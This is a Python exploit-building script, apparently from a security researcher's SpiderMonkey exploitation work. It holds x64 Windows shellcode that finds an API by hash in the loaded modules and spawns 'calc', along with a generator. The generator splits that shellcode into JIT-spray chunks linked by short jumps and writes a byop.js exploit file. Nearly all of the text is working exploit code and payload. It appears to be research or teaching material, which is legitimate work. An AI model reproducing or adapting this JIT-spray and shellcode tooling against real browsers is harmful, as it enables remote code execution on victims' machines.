# Axel '0vercl0k' Souchet - 04 November 2018
from collections import namedtuple
from subprocess import check_output
from keystone import *
from capstone import *

payload = '''00007ff6`6ede1021 50              push    rax
00007ff6`6ede1022 53              push    rbx
00007ff6`6ede1023 51              push    rcx
00007ff6`6ede1024 52              push    rdx
00007ff6`6ede1025 55              push    rbp
00007ff6`6ede1026 56              push    rsi
00007ff6`6ede1027 57              push    rdi
00007ff6`6ede1028 4150            push    r8
00007ff6`6ede102a 4151            push    r9
00007ff6`6ede102c 4152            push    r10
00007ff6`6ede102e 4153            push    r11
00007ff6`6ede1030 4154            push    r12
00007ff6`6ede1032 4155            push    r13
00007ff6`6ede1034 4156            push    r14
00007ff6`6ede1036 4157            push    r15
00007ff6`6ede1038 4c8bdc          mov     r11,rsp
00007ff6`6ede103b 4883ec10        sub     rsp,10h
00007ff6`6ede103f 4883ec70        sub     rsp,70h
00007ff6`6ede1043 4883ec70        sub     rsp,70h
00007ff6`6ede1047 6683e4f0        and     sp,0FFF0h
00007ff6`6ede104b b863616c63      mov     eax,636C6163h
00007ff6`6ede1050 890424          mov     dword ptr [rsp],eax
00007ff6`6ede1053 c644240400      mov     byte ptr [rsp+4],0
00007ff6`6ede1058 33c0            xor     eax,eax
00007ff6`6ede105a 49895b08        mov     qword ptr [r11+8],rbx
00007ff6`6ede105e 498d7b88        lea     rdi,[r11-78h]
00007ff6`6ede1062 49897310        mov     qword ptr [r11+10h],rsi
00007ff6`6ede1066 b968000000      mov     ecx,68h
00007ff6`6ede106b 33ed            xor     ebp,ebp
00007ff6`6ede106d f3aa            rep stos byte ptr [rdi]
00007ff6`6ede106f c644247068      mov     byte ptr [rsp+70h],68h
00007ff6`6ede1074 b860000000      mov     eax,60h
00007ff6`6ede1079 6765488b00      mov     rax,qword ptr gs:[eax]
00007ff6`6ede107e 488b4818        mov     rcx,qword ptr [rax+18h]
00007ff6`6ede1082 4c8b4110        mov     r8,qword ptr [rcx+10h]
00007ff6`6ede1086 498b7860        mov     rdi,qword ptr [r8+60h]
00007ff6`6ede108a 4c8bcf          mov     r9,rdi
00007ff6`6ede108d 4885ff          test    rdi,rdi
00007ff6`6ede1090 742f            je      00007ff6`6ede10c1
00007ff6`6ede1092 0fb70f          movzx   ecx,word ptr [rdi]
00007ff6`6ede1095 b805150000      mov     eax,1505h
00007ff6`6ede109a 8bd5            mov     edx,ebp
00007ff6`6ede109c 6685c9          test    cx,cx
00007ff6`6ede109f 7420            je      00007ff6`6ede10c1
00007ff6`6ede10a1 0f1f0400        nop     dword ptr [rax+rax]
00007ff6`6ede10a5 0fb7c9          movzx   ecx,cx
00007ff6`6ede10a8 ffc2            inc     edx
00007ff6`6ede10aa 6bc021          imul    eax,eax,21h
00007ff6`6ede10ad 03c1            add     eax,ecx
00007ff6`6ede10af 8bca            mov     ecx,edx
00007ff6`6ede10b1 0fb70c57        movzx   ecx,word ptr [rdi+rdx*2]
00007ff6`6ede10b5 6685c9          test    cx,cx
00007ff6`6ede10b8 75eb            jne     00007ff6`6ede10a5
00007ff6`6ede10ba 3d5595db6d      cmp     eax,6DDB9555h
00007ff6`6ede10bf 7434            je      00007ff6`6ede10f5
00007ff6`6ede10c1 4d8b00          mov     r8,qword ptr [r8]
00007ff6`6ede10c4 498b7860        mov     rdi,qword ptr [r8+60h]
00007ff6`6ede10c8 493bf9          cmp     rdi,r9
00007ff6`6ede10cb 75c0            jne     00007ff6`6ede108d
00007ff6`6ede10cd b801000000      mov     eax,1
00007ff6`6ede10d2 488d642470      lea     rsp,[rsp+70h]
00007ff6`6ede10d7 4883c470        add     rsp,70h
00007ff6`6ede10db 4883c418        add     rsp,18h
00007ff6`6ede10df 415f            pop     r15
00007ff6`6ede10e1 415e            pop     r14
00007ff6`6ede10e3 415d            pop     r13
00007ff6`6ede10e5 415c            pop     r12
00007ff6`6ede10e7 415b            pop     r11
00007ff6`6ede10e9 4159            pop     r9
00007ff6`6ede10eb 4158            pop     r8
00007ff6`6ede10ed 5f              pop     rdi
00007ff6`6ede10ee 5e              pop     rsi
00007ff6`6ede10ef 5d              pop     rbp
00007ff6`6ede10f0 5a              pop     rdx
00007ff6`6ede10f1 59              pop     rcx
00007ff6`6ede10f2 5b              pop     rbx
00007ff6`6ede10f3 58              pop     rax
00007ff6`6ede10f4 c3              ret
00007ff6`6ede10f5 4d8b5030        mov     r10,qword ptr [r8+30h]
00007ff6`6ede10f9 4d85d2          test    r10,r10
00007ff6`6ede10fc 74cf            je      00007ff6`6ede10cd
00007ff6`6ede10fe 4963423c        movsxd  rax,dword ptr [r10+3Ch]
00007ff6`6ede1102 4a8d0c10        lea     rcx,[rax+r10]
00007ff6`6ede1106 4883c170        add     rcx,70h
00007ff6`6ede110a 4883c118        add     rcx,18h
00007ff6`6ede110e 8b09            mov     ecx,dword ptr [rcx]
00007ff6`6ede1110 85c9            test    ecx,ecx
00007ff6`6ede1112 74b9            je      00007ff6`6ede10cd
00007ff6`6ede1114 458b4c0a20      mov     r9d,dword ptr [r10+rcx+20h]
00007ff6`6ede1119 498d040a        lea     rax,[r10+rcx]
00007ff6`6ede111d 8b5824          mov     ebx,dword ptr [rax+24h]
00007ff6`6ede1120 4d03ca          add     r9,r10
00007ff6`6ede1123 8b701c          mov     esi,dword ptr [rax+1Ch]
00007ff6`6ede1126 4903da          add     rbx,r10
00007ff6`6ede1129 448b5818        mov     r11d,dword ptr [rax+18h]
00007ff6`6ede112d 4903f2          add     rsi,r10
00007ff6`6ede1130 448bc5          mov     r8d,ebp
00007ff6`6ede1133 4585db          test    r11d,r11d
00007ff6`6ede1136 7495            je      00007ff6`6ede10cd
00007ff6`6ede1138 0f1f0400        nop     dword ptr [rax+rax]
00007ff6`6ede113c 418b39          mov     edi,dword ptr [r9]
00007ff6`6ede113f b905150000      mov     ecx,1505h
00007ff6`6ede1144 4903fa          add     rdi,r10
00007ff6`6ede1147 8bd5            mov     edx,ebp
00007ff6`6ede1149 0fb607          movzx   eax,byte ptr [rdi]
00007ff6`6ede114c 84c0            test    al,al
00007ff6`6ede114e 7420            je      00007ff6`6ede1170
00007ff6`6ede1150 0fbec0          movsx   eax,al
00007ff6`6ede1153 ffc2            inc     edx
00007ff6`6ede1155 6bc921          imul    ecx,ecx,21h
00007ff6`6ede1158 03c8            add     ecx,eax
00007ff6`6ede115a 8bc2            mov     eax,edx
00007ff6`6ede115c 0fb6043a        movzx   eax,byte ptr [rdx+rdi]
00007ff6`6ede1160 84c0            test    al,al
00007ff6`6ede1162 75ec            jne     00007ff6`6ede1150
00007ff6`6ede1164 50              push    rax
00007ff6`6ede1165 488bc1          mov     rax,rcx
00007ff6`6ede1168 3d192eb5ae      cmp     eax,0AEB52E19h
00007ff6`6ede116d 58              pop     rax
00007ff6`6ede116e 7411            je      00007ff6`6ede1181
00007ff6`6ede1170 41ffc0          inc     r8d
00007ff6`6ede1173 4983c104        add     r9,4
00007ff6`6ede1177 453bc3          cmp     r8d,r11d
00007ff6`6ede117a 72c0            jb      00007ff6`6ede113c
00007ff6`6ede117c e94cffffff      jmp     00007ff6`6ede10cd
00007ff6`6ede1181 418bc0          mov     eax,r8d
00007ff6`6ede1184 0fb70c43        movzx   ecx,word ptr [rbx+rax*2]
00007ff6`6ede1188 8b048e          mov     eax,dword ptr [rsi+rcx*4]
00007ff6`6ede118b 4903c2          add     rax,r10
00007ff6`6ede118e 0f8439ffffff    je      00007ff6`6ede10cd
00007ff6`6ede1194 488d4c2410      lea     rcx,[rsp+10h]
00007ff6`6ede1199 4533c9          xor     r9d,r9d
00007ff6`6ede119c 48894c2448      mov     qword ptr [rsp+48h],rcx
00007ff6`6ede11a1 488d1424        lea     rdx,[rsp]
00007ff6`6ede11a5 488d4c2470      lea     rcx,[rsp+70h]
00007ff6`6ede11aa 4883c110        add     rcx,10h
00007ff6`6ede11ae 4533c0          xor     r8d,r8d
00007ff6`6ede11b1 48894c2440      mov     qword ptr [rsp+40h],rcx
00007ff6`6ede11b6 33c9            xor     ecx,ecx
00007ff6`6ede11b8 48896c2438      mov     qword ptr [rsp+38h],rbp
00007ff6`6ede11bd 48896c2430      mov     qword ptr [rsp+30h],rbp
00007ff6`6ede11c2 896c2428        mov     dword ptr [rsp+28h],ebp
00007ff6`6ede11c6 896c2420        mov     dword ptr [rsp+20h],ebp
00007ff6`6ede11ca ffd0            call    rax
00007ff6`6ede11cc 33c0            xor     eax,eax
00007ff6`6ede11ce e9fffeffff      jmp     00007ff6`6ede10d2
'''

Instruction = namedtuple(
    'Instruction',
    ['address', 'bytes', 'disassembly']
)

def assemble_payload(p):
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    assembled, ninstr = ks.asm('\n'.join(i.disassembly for i in p))
    return ''.join(map(chr, assembled)), ninstr

def remove_last_x(l, i, x):
    '''
    In [1]: x
    Out[1]: ['x', 'nop', 'nop', 'nop', 'y']
    In [2]: remove_last_x(x, 4, 3)
    Out[2]: ['x', 'y']
    '''
    if x < 0:
        raise Exception('x must be positive')
    return l[0 : i - x] + l[i : ]

def main():
    # first pass we get all the information we need
    original_payload = []
    original_payload_size = 0
    for line in payload.splitlines():
        addr, bytes, disass = line.split(None, 2)
        bytes = bytes.decode('hex')

        if len(bytes) > 6:
            s = 'Cannot encode %s as it is too big, aborting' % repr(disass)
            raise Exception(s)

        original_payload_size += len(bytes)
        original_payload.append(Instruction(
            addr, bytes, disass
        ))

    print '[+] Extracted the original payload,', original_payload_size, 'bytes (see _p0.asm)'
    with open('_p0.asm', 'w') as f:
        for addr, _, disass in original_payload:
            f.write(addr + ' ' + disass + '\n')

    # second pass we start to lay down the labels
    for i in range(len(original_payload)):
        disass = original_payload[i].disassembly
        need_label = disass.startswith('je ') or disass.startswith('jne ') \
                     or disass.startswith('jmp ') or disass.startswith('jb') \
                     or disass.startswith('call ')

        if not need_label:
            continue

        # call rax
        _, dst = disass.split(None, 1)
        if dst[0].lower() not in list('0123456789abcdef'):
            continue

        label = '_' + dst.replace('`', '')
        # print '>> Creating', label,'to replace', dst
        original_payload[i] = original_payload[i]._replace(
            disassembly = disass.replace(dst, label)
        )

        for j in range(len(original_payload)):
            dstaddr, _, dstdisass = original_payload[j]
            if dstaddr != dst:
                continue

            # print '>>> Inserting', label, 'before', dstdisass
            if dstdisass.startswith(label):
                continue

            original_payload[j] = original_payload[j]._replace(
                disassembly = '%s: %s' % (label, dstdisass)
            )

    print '[+] Replaced absolute references by labels (see _p1.asm)'
    with open('_p1.asm', 'w') as f:
        for _, _, disass in original_payload:
            f.write(disass + '\n')

    rel_payload_asm = []
    for i in range(len(original_payload)):
        addr, bytes, disass = original_payload[i]
        nextbytes = None
        if (i + 1) < len(original_payload):
            nextbytes = original_payload[i + 1].bytes

        rel_payload_asm.append(Instruction(
            0, bytes, disass
        ))

        # 000003b5`9f79b95e 49bb9090909090cceb09 mov r11,9EBCC9090909090h
        # 000003b5`9f79b968 4c899d60f8ffff  mov     qword ptr [rbp-7A0h],r11
        # 000003b5`9f79b96f 49bb909090909055eb09 mov r11,9EB559090909090h
        # 2 for the short jmp that allows us to branch to the next part,
        # 7 to jump over the 'mov qword ptr [rbp-off], r11', and 2 to jump over
        # the first 2 bytes of the 'mov r11, cst' in our payload data.
        nb_bytes = 2 + 7 + 2
        if nextbytes is not None:
            # Then, there's also 6 - sizeof(next instr) bytes of nop.
            nb_bytes += 6 - len(nextbytes)

        for _ in range(nb_bytes):
            rel_payload_asm.append(Instruction(
                0, '\x90', '.byte 90h'
            ))

    pass_n = 2
    while True:
        rel_payload, ninstr = assemble_payload(rel_payload_asm)
        print '[+] #%d' % (pass_n - 1), 'Assembled payload,', len(rel_payload), 'bytes,', ninstr, 'instructions (_p%d.asm/.bin)' % pass_n
        with open('_p%d.asm' % pass_n, 'w') as f:
            for instr in rel_payload_asm:
                f.write(instr.disassembly + '\n')

        with open('_p%d.bin' % pass_n, 'wb') as f:
            f.write(rel_payload)

        cs = Cs(CS_ARCH_X86, CS_MODE_64)
        reassembled_payload = list(cs.disasm(rel_payload, 0))
        if len(reassembled_payload) != len(rel_payload_asm):
            raise Exception("something ain't right")

        i = -1
        instrs = list(zip(rel_payload_asm, reassembled_payload))
        converged = True
        for origininstr, instr in instrs:
            i += 1
            original_size = len(origininstr.bytes)
            if original_size == instr.size or i == 0:
                continue

            rel_payload_asm[i] = rel_payload_asm[i]._replace(
                bytes = instr.bytes
            )

            converged = False
            nb_to_remove = instr.size - original_size

            print '  >', instr.mnemonic, instr.op_str, 'has been encoded with a', 'shorter' if nb_to_remove < 0 else 'larger','size instr', len(origininstr.bytes), 'VS', instr.size
            if nb_to_remove < 0:
                for _ in range(abs(nb_to_remove)):
                    rel_payload_asm.insert(i, Instruction(
                        0, '\x90', '.byte 90h'
                    ))
                    i += 1
            else:
                rel_payload_asm = remove_last_x(rel_payload_asm, i, nb_to_remove)
                i -= nb_to_remove

        if converged:
            break

        pass_n += 1

    print '[*] Generating bring_your_own_payload.js..'
    hdr = open('bring_your_own_payload_header.js', 'r').read()
    with open('bring_your_own_payload.js', 'w') as byop, open('_final.asm', 'w') as final:
        byop.write(hdr)
        byop.write('''Payload.push(...[
    // Magic
    [0x30, 0x76, 0x65, 0x72, 0x63, 0x6c, 0x30, 0x6b],
    [0x90],
''')
        for instr in cs.disasm(rel_payload, 0):
            if instr.mnemonic == 'nop' and instr.size == 1:
                continue

            bytes = ''.join('%02x' % b for b in instr.bytes)
            comment = '%04x: %s %s %s' % (
                instr.address,
                bytes,
                instr.mnemonic,
                instr.op_str
            )


            byop.write('    // %s\n' % comment)
            byop.write('    [%s],\n' % ', '.join('0x%02x' % b for b in instr.bytes))
            final.write('%s %s ; %s\n' % (instr. mnemonic, instr.op_str, bytes))

        byop.write(']);\n\n')
        byop.write('print(gen_func_jitpayload(Payload));\n')

    print '[*] Spawning js.exe..'
    byop = check_output([
        r'..\js-release\js.exe',
        '-s',
        'bring_your_own_payload.js'
    ])

    print '[*] Outputing byop.js..'
    with open(r'..\exploits\byop.js', 'w') as f:
        f.write(byop.replace('\r\n', '\n'))

if __name__ == '__main__':
    main()
